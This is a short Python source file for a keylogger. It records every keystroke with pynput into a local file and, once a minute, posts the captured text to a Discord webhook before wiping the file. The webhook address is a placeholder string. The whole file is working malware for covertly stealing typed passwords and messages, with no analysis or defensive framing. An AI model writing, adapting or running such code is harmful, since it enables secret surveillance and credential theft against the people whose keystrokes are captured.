import os
import time
import requests
import shutil
import sys
from pynput import keyboard
import winshell

discord = 'asdasdasdasadasootherpeoplecantgetmydiscrodwebhook'
file = "keylog.txt"

def send_to_discord(ss):
    q = {
        "tt": ss
    }
    requests.post(discord, json=q)

def on_press(key):
    try:
        with open(file, "a") as lol:
            lol.write(f"{key.char}\n")
    except AttributeError:
        with open(file, "a") as lol:
            lol.write(f"{key}\n")

with keyboard.Listener(on_press=on_press) as listener:

    while True:
        time.sleep(60)

        if os.path.exists(file):
            with open(file, 'r') as f:
                ee = f.read()
            send_to_discord(ee)

            with open(file, "w") as lol:
                lol.write("")

listener.join()
